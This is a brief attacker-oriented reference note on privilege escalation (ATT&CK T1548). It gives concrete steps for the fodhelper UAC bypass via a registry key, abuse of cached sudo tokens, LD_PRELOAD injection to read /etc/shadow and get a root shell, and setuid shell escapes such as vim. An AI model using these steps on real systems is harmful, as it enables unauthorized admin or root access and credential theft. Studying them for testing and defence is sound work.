---
title: Abuse Elevation Control Mechanism
tags: [priv-esc, uac-bypass, sudo, setuid]
description: Bypassing User Account Control (UAC) on Windows and abusing Sudo/Setuid on Linux.
date: 2024-01-02
---

# Abuse Elevation Control Mechanism (T1548)

Bypassing the gates that separate User from Admin.

## 1. Bypass User Account Control (Windows)
UAC is the prompt that says "Do you want to allow this app into make changes?".
**Goal**: Execute a command as High Integrity without the user seeing the prompt (Auto-Elevation).

### Fodhelper Method (File)
`fodhelper.exe` is a Windows binary that auto-elevates. It looks at a specific Registry key.
1.  **Key**: `HKCU\Software\Classes\ms-settings\Shell\Open\command`
2.  **Value**: `DelegateExecute` (Empty)
3.  **Value**: `(Default)` -> `cmd.exe /c start malware.exe`
4.  **Trigger**: Run `fodhelper.exe`.
5.  **Result**: `malware.exe` runs as High Integrity (Admin).

## 2. Abusing Sudo (Linux)
Sudo allows running commands as root.

### Sudo Caching
If a user runs `sudo apt update` and types their password, sudo **caches** the token for 15 minutes (default).
- **Attack**: If you compromise the user during this window, you can run `sudo malware` without a password.

### LD_PRELOAD
If `sudo` is configured with `env_keep+=LD_PRELOAD`, we can inject a C library.
1.  Create `evil.so` that spawns a shell in the `_init()` function.
2.  Run `sudo LD_PRELOAD=./evil.so cat /etc/shadow`.
3.  **Result**: Root shell.

## 3. Setuid and Setgid
Binaries with the `s` bit run as the file owner (usually root).
- **Find**: `find / -perm -u=s -type f 2>/dev/null`
- **GTFOBins**: If `vim` has suid, run `vim -c ':!/bin/sh'`. You are now root.
